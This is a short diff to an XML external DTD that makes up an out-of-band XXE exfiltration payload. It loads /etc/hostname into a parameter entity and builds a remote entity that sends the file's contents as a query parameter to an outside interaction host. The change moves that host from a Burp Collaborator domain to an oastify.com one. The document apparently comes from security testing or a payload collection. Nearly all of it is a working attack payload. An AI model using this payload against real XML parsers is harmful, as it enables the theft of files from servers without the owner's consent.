@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "/etc/hostname">
-<!ENTITY % payload "<!ENTITY &#37; remote SYSTEM 'https://p2s0mswjmfzq5gy6071iypldn4tvhk.burpcollaborator.net/?leak=%file;'>">
+<!ENTITY % payload "<!ENTITY &#37; remote SYSTEM 'https://402kdwfff0s4vx0mzvpzd75x1o7fv5ju.oastify.com/?leak=%file;'>">
 %payload;
 %remote;
